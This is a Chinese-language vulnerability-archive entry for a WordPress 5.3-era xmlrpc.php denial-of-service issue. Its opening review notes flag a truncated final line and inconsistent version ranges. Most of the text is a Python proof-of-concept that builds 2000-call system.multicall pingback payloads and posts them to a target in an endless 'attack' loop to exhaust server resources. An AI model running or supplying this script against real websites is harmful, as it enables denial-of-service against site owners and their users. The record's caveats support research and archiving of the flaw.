---
source: "hatch 补库批 20260928"
product: "WordPress XML-RPC pingback"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "WordPress <=5.3.0 xmlrpc.php 拒绝服务漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：xmlrpc/pingback enabled and accessible, valid target post/external callback; <=5.3 claim unverified"
side_effects: "未执行；本文需注意的操作影响：持续循环会消耗目标资源和带宽，保留原方法但只能在授权隔离资源限额内使用；标题 ≤5.3.0、≤5.3.x 和正文 ≤5.3 并非同一范围，版本与资源耗尽根因待核。"
source_status: "unknown"
id: "vw-0df5364ead8c14a4276e561c"
entity_id: "ve-0df5364ead8c14a4276e561c"
schema_version: "1"
---

## 核对与使用边界

- 明确更正：脚本结尾 `main(*get_args()` 缺右括号，原文截断，不能原样运行；不能根据版本探测打印和非 200 响应确认 DoS。
- 持续循环会消耗目标资源和带宽，保留原方法但只能在授权隔离资源限额内使用；标题 ≤5.3.0、≤5.3.x 和正文 ≤5.3 并非同一范围，版本与资源耗尽根因待核。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：xmlrpc/pingback enabled and accessible, valid target post/external callback; &lt;=5.3 claim unverified

- **结论使用边界（1）**：文件名&lt;=5.3.0、标题&lt;=5.3.x、正文&lt;=5.3和脚本5.3.?范围不一致。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **代码与转录边界（2）**：最后main(*get_args()缺右括号，脚本明确截断。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **结论使用边界（3）**：check仅打印响应让人自行判断，不是自动确认；非200不能证明DoS，持续攻击循环不能当安全检测。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（4）**：简介空白、缺原始漏洞公告/修复与资源耗尽机制；脚本作者行只有域名。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# WordPress \<=5.3.x xmlrpc.php拒绝服务漏洞

一、漏洞简介
------------

二、漏洞影响
------------

WordPress \<= 5.3

三、复现过程
------------

漏洞文件

    /wordpress/xmlrpc.php
    /wp/xmlrpc.php
    from urllib.parse import urlparse
    import sys, uuid, urllib3, requests
    urllib3.disable_warnings()

    DEBUG = True 
    def dprint(X):
        if DEBUG: print(X)

    COUNT=0
    def build_entry(pingback,target):
        global COUNT
        COUNT +=1
        entry  = "<value><struct><member><name>methodName</name><value>pingback.ping</value></member><member>"
        entry += f"<name>params</name><value><array><data><value>{pingback}/{COUNT}</value>"
        #entry += f"<name>params</name><value><array><data><value>{pingback}/{uuid.uuid4()}</value>"
        entry += f"<value>{target}/?p=1</value></data></array></value></member></struct></value>"
        #entry += f"<value>{target}/#e</value></data></array></value></member></struct></value>" # taxes DB more
        return entry

    def build_request(pingback,target,entries):
        prefix   = "<methodCall><methodName>system.multicall</methodName><params><param><array>"
        suffix   = "</array></param></params></methodCall>"
        request  = prefix
        for _ in range(0,entries): request += build_entry(pingback,target)
        request += suffix
        return request

    def usage_die():
        print(f"[!] Usage: {sys.argv[0]} <check/attack> <pingback url> <target url>")
        exit(1)

    def get_args():
        if len(sys.argv) != 4: usage_die()
        action   = sys.argv[1]
        pingback = sys.argv[2]
        target   = sys.argv[3]
        if action not in ("check","attack"): usage_die()
        for URL in (pingback,target):
            res = urlparse(URL)
            if not all((res.scheme,res.netloc)): usage_die()
        return (action,pingback,target)

    def main(action,pingback,target):
        print("[>] WordPress <= 5.3.? Denial-of-Service PoC")
        print("[>] @roddux 2019 | Arcturus Security | labs.arcturus.net")
        # he checc
        if action == "check":    entries = 2
        # he attacc
        elif action == "attack": entries = 2000
        # but most importantly
        print(f"[+] Running in {action} mode")
        # he pingbacc
        print(f"[+] Got pingback URL \"{pingback}\"")
        print(f"[+] Got target URL \"{target}\"")
        print(f"[+] Building {entries} pingback calls")
        # entries = 1000 # TESTING
        xmldata = build_request(pingback,target,entries)
        dprint("[+] Request:\n")
        dprint(xmldata+"\n")
        print(f"[+] Request size: {len(xmldata)} bytes")
        if action == "attack":
            print("[+] Starting attack loop, CTRL+C to stop...")
            rcount = 0
            try:
                while True:
                        try:
                            resp  = requests.post(f"{target}/xmlrpc.php", xmldata, verify=False, allow_redirects=False, timeout=.2)
                            #dprint(resp.content.decode("UTF-8")[0:500]+"\n")
                            if resp.status_code != 200:
                                print(f"[!] Received odd status ({resp.status_code}) -- DoS successful?")
                        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
                            pass
                        rcount += 1
                        print(f"\r[+] Requests sent: {rcount}",end="")
            except KeyboardInterrupt:
                print("\n[>] Attack finished",end="\n\n")
                exit(0)
        elif action == "check":
            print("[+] Sending check request")
            try:
                resp = requests.post(f"{target}/xmlrpc.php", xmldata, verify=False, allow_redirects=False, timeout=10)
                if resp.status_code != 200:
                    print(f"[!] Received odd status ({resp.status_code}) -- check target url")
                print("[+] Request sent")
                print("[+] Response headers:\n")
                print(resp.headers)
                print("[+] Response dump:")
                print(resp.content.decode("UTF-8"))
                print("[+] Here's the part where you figure out if it's vulnerable, because I CBA to code it")
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
                print("[!] Connection error")
                exit(1)
            print("[>] Check finished")

    if __name__ == "__main__":
        main(*get_args()
